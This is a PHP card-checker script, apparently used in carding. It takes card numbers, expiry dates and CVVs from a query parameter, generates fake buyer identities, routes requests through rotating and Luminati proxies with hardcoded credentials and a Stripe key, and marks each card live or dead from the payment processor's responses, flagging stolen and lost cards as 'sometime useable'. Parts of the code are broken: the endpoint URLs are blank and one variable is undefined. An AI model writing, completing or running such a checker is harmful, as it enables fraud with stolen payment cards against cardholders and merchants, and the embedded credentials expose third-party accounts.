<?php

error_reporting(0);


function multiexplode($delimiters, $string)
{
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function getStr2($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];

    $lista = "$cc|$mes|$ano|$cvv";
}

function getBin($cc)
{
    $bin = substr($cc, 0, 6);
    $searchfor = $bin;
    $contents = file_get_contents('bins.csv');
    $pattern = preg_quote($searchfor, '/');
    $pattern = "/^.*$pattern.*\$/m";
    if (preg_match_all($pattern, $contents, $matches)) {
        $encontrada = implode("\n", $matches[0]);
    }
    $pieces = explode(";", $encontrada);
    $c = count($pieces);
    if ($c == 8) {
        $pais = $pieces[4];
        $paiscode = $pieces[5];
        $banco = $pieces[2];
        $level = $pieces[3];
        $bandeira = $pieces[1];
    } else {
        $pais = $pieces[5];
        $paiscode = $pieces[6];
        $level = $pieces[4];
        $banco = $pieces[2];
        $bandeira = $pieces[1];
    }
    return '' . $bandeira . ' ' . $banco . ' ' . $level . '(' . $pais . ')';
}


$bin = substr($cc, 0, 6);
$bin = getBin($bin);


function proxy(){
    $proxy = file("proxy.txt");
    $myproxy = rand(0, sizeof($proxy)-1);
    $proxy = $proxy[$myproxy];
    return $proxy;
}
$proxy = proxy();
$keys = array(
    1 => 'pk_live_SMtnnvlq4TpJelMdklNha8iD'
);
$key = array_rand($keys);
$keyStripe = $keys[$key];

function value($str, $find_start, $find_end)
{
    $start = @strpos($str, $find_start);
    if ($start === false) {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str, $start + $length), $find_end);
    return trim(substr($str, $start + $length, $end));
}

function mod($dividendo, $divisor)
{
    return round($dividendo - (floor($dividendo / $divisor) * $divisor));
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, 'postcode":', ',');
$state = value($resposta, 'state":"', '"');
$email = value($resposta, 'email":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, 'street":"', '"');
$numero1 = substr($phone, 1, 3);
$numero2 = substr($phone, 6, 3);
$numero3 = substr($phone, 10, 4);
$phone = $numero1 . '' . $numero2 . '' . $numero3;
$serve_arr = array("gmail.com", "homtail.com", "yahoo.com.br", "bol.com.br", "yopmail.com", "outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email = str_replace("example.com", $serv_rnd, $email);
if ($state == "Alabama") {
    $state = "AL";
} else if ($state == "alaska") {
    $state = "AK";
} else if ($state == "arizona") {
    $state = "AR";
} else if ($state == "california") {
    $state = "CA";
} else if ($state == "olorado") {
    $state = "CO";
} else if ($state == "connecticut") {
    $state = "CT";
} else if ($state == "delaware") {
    $state = "DE";
} else if ($state == "district of columbia") {
    $state = "DC";
} else if ($state == "florida") {
    $state = "FL";
} else if ($state == "georgia") {
    $state = "GA";
} else if ($state == "hawaii") {
    $state = "HI";
} else if ($state == "idaho") {
    $state = "ID";
} else if ($state == "illinois") {
    $state = "IL";
} else if ($state == "indiana") {
    $state = "IN";
} else if ($state == "iowa") {
    $state = "IA";
} else if ($state == "kansas") {
    $state = "KS";
} else if ($state == "kentucky") {
    $state = "KY";
} else if ($state == "louisiana") {
    $state = "LA";
} else if ($state == "maine") {
    $state = "ME";
} else if ($state == "maryland") {
    $state = "MD";
} else if ($state == "massachusetts") {
    $state = "MA";
} else if ($state == "michigan") {
    $state = "MI";
} else if ($state == "minnesota") {
    $state = "MN";
} else if ($state == "mississippi") {
    $state = "MS";
} else if ($state == "missouri") {
    $state = "MO";
} else if ($state == "montana") {
    $state = "MT";
} else if ($state == "nebraska") {
    $state = "NE";
} else if ($state == "nevada") {
    $state = "NV";
} else if ($state == "new hampshire") {
    $state = "NH";
} else if ($state == "new jersey") {
    $state = "NJ";
} else if ($state == "new mexico") {
    $state = "NM";
} else if ($state == "new york") {
    $state = "LA";
} else if ($state == "north carolina") {
    $state = "NC";
} else if ($state == "north dakota") {
    $state = "ND";
} else if ($state == "Ohio") {
    $state = "OH";
} else if ($state == "oklahoma") {
    $state = "OK";
} else if ($state == "oregon") {
    $state = "OR";
} else if ($state == "pennsylvania") {
    $state = "PA";
} else if ($state == "rhode Island") {
    $state = "RI";
} else if ($state == "south carolina") {
    $state = "SC";
} else if ($state == "south dakota") {
    $state = "SD";
} else if ($state == "tennessee") {
    $state = "TN";
} else if ($state == "texas") {
    $state = "TX";
} else if ($state == "utah") {
    $state = "UT";
} else if ($state == "vermont") {
    $state = "VT";
} else if ($state == "virginia") {
    $state = "VA";
} else if ($state == "washington") {
    $state = "WA";
} else if ($state == "west virginia") {
    $state = "WV";
} else if ($state == "wisconsin") {
    $state = "WI";
} else if ($state == "wyoming") {
    $state = "WY";
} else {
    $state = "KY";
}

$ch = curl_init();
$username = 'lum-customer-hl_6e2b8981-zone-static';
$password = 'tdjtnn8481o3';
$port = 22225;
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';
$result = curl_exec($curl);
curl_close($curl);

$ch = curl_init();
//////////======= LUMINATI
///curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
///curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
//////////======= Socks Proxy
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_URL, ' ');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'accept: ',
    'accept-encoding: ',
    'accept-language: ',
    'content-type:',
    'origin: ',
    'referer: ',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36',
));
curl_setopt($ch, CURLOPT_POSTFIELDS, ' ');
$resultado = curl_exec($ch);
$token = trim(strip_tags(getStr2($resultado, '"id": "', '",')));

///////$ch = curl_init();
//////////======= LUMINATI
curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
//////////======= Socks Proxy
// curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_URL, ' ');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
	'Accept:',
    'Accept-Encoding: ',
    'Accept-Language: ',
    'Content-Type: ',
    'Origin: ',
    'Referer: ',
    'Sec-Fetch-Mode: cors',
    'sec-fetch-site: same-origin',
    'X-Requested-With: XMLHttpRequest',

));
curl_setopt($ch, CURLOPT_POSTFIELDS, ' ');

echo $resultado = curl_exec($ch);


if (strpos($result, '"cvc_check": "pass"')) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">âœ“</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">âœ“</span> <span class="badge badge-success">  ♛ CV MATCHED  ♛ 𝕽𝖊𝖇𝖔𝖔𝖙 ♛  ♛ </span></br>';
}
elseif(strpos($result, "Thank You For Donation." )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">âœ“</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">âœ“</span> <span class="badge badge-success">  ♛ CVC MATCHED  ♛ 𝕽𝖊𝖇𝖔𝖔𝖙 ♛  ♛ </span></br>';
}
elseif(strpos($result, "Thank You." )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">âœ“</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">âœ“</span> <span class="badge badge-success">  ♛ CVC MATCHED  ♛ 𝕽𝖊𝖇𝖔𝖔𝖙 ♛  ♛ </span></br>';
}
elseif(strpos($result, 'security code is incorrect.' )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">âœ“</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">âœ“</span> <span class="badge badge-info">  ♛ CCN LIVE  ♛ 𝕽𝖊𝖇𝖔𝖔𝖙 ♛  ♛ </span></br>';
}
elseif(strpos($result, 'security code is invalid.' )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">âœ“</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">âœ“</span> <span class="badge badge-info">  ♛ CCN LIVE  ♛ 𝕽𝖊𝖇𝖔𝖔𝖙 ♛  ♛ </span></br>';
}
elseif (strpos($result, "incorrect_cvc")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">âœ“</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">âœ“</span> <span class="badge badge-info">  ♛ CCN LIVE  ♛ 𝕽𝖊𝖇𝖔𝖔𝖙 ♛  ♛ </span></br>';
}
elseif(strpos($result, 'Your card zip code is incorrect.' )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">âœ“</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">âœ“</span> <span class="badge badge-success">  ♛ CVC MATCHED - Incorrect Zip  ♛ 𝕽𝖊𝖇𝖔𝖔𝖙 ♛  ♛ </span></br>';
}
elseif (strpos($result, "stolen_card")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">âœ“</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">âœ“</span> <span class="badge badge-info">  ♛ Stolen_Card - Sometime Useable  ♛ 𝕽𝖊𝖇𝖔𝖔𝖙 ♛  ♛ </span></br>';
}
elseif (strpos($result, "lost_card")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">âœ“</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">âœ“</span> <span class="badge badge-info">  ♛ Lost_Card - Sometime Useable  ♛ 𝕽𝖊𝖇𝖔𝖔𝖙 ♛  ♛ </span></br>';
}
elseif(strpos($result, 'Your card has insufficient funds.')) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">âœ“</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">âœ“</span> <span class="badge badge-info">  ♛ Insufficient Funds  ♛ 𝕽𝖊𝖇𝖔𝖔𝖙 ♛  ♛ </span></br>';
}
elseif(strpos($result, 'Your card has expired.')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">âœ•</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">âœ•</span> <span class="badge badge-info">  ♛ Card Expired  ♛ 𝕽𝖊𝖇𝖔𝖔𝖙 ♛  ♛</span> </br>';
}
elseif (strpos($result, "pickup_card")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">âœ“</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">âœ“</span> <span class="badge badge-info">  ♛ Pickup Card_Card - Sometime Useable  ♛ 𝕽𝖊𝖇𝖔𝖔𝖙 ♛  ♛ </span></br>';
}
elseif(strpos($result, 'Your card number is incorrect.')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">âœ•</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">âœ•</span> <span class="badge badge-info">  ♛ Incorrect Card Number  ♛ 𝕽𝖊𝖇𝖔𝖔𝖙 ♛  ♛</span> </br>';
}
 elseif (strpos($result, "incorrect_number")) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">âœ•</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">âœ•</span> <span class="badge badge-info">  ♛ Incorrect Card Number  ♛ 𝕽𝖊𝖇𝖔𝖔𝖙 ♛  ♛</span> </br>';
}
elseif(strpos($result, 'Your card was declined.')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">âœ•</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">âœ•</span> <span class="badge badge-info">  ♛ Card Declined  ♛ 𝕽𝖊𝖇𝖔𝖔𝖙 ♛  ♛</span> </br>';
}
elseif (strpos($result, "generic_decline")) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">âœ•</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">âœ•</span> <span class="badge badge-info">  ♛ Declined : Generic_Decline  ♛ 𝕽𝖊𝖇𝖔𝖔𝖙 ♛  ♛</span> </br>';
}
elseif (strpos($result, "do_not_honor")) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">âœ•</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">âœ•</span> <span class="badge badge-info">  ♛ Declined : Do_Not_Honor  ♛ 𝕽𝖊𝖇𝖔𝖔𝖙 ♛  ♛</span> </br>';
}
elseif (strpos($result, '"cvc_check": "unchecked"')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">âœ•</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">âœ•</span> <span class="badge badge-info">  ♛ Security Code Check : Unchecked [Proxy Dead]  ♛ 𝕽𝖊𝖇𝖔𝖔𝖙 ♛  ♛</span> </br>';
}
elseif (strpos($result, '"cvc_check": "fail"')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">âœ•</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">âœ•</span> <span class="badge badge-info">  ♛ Security Code Check : Fail  ♛ 𝕽𝖊𝖇𝖔𝖔𝖙 ♛  ♛</span> </br>';
}
elseif (strpos($result, "expired_card")) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">âœ•</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">âœ•</span> <span class="badge badge-info">  ♛ Expired Card  ♛ 𝕽𝖊𝖇𝖔𝖔𝖙 ♛  ♛</span> </br>';
}
elseif (strpos($result,'Your card does not support this type of purchase.')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">âœ•</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">âœ•</span> <span class="badge badge-info">  ♛ Card Doesnt Support This Purchase  ♛ 𝕽𝖊𝖇𝖔𝖔𝖙 ♛  ♛</span> </br>';
}
 else {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">âœ•</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">âœ•</span> <span class="badge badge-info">  ♛ Proxy Dead / Error Not Listed  ♛ 𝕽𝖊𝖇𝖔𝖔𝖙 ♛  ♛</span> </br>';
}

curl_close($ch);
ob_flush();
//////=========Comment Echo $result If U Want To Hide Site Side Response
echo $result 

?>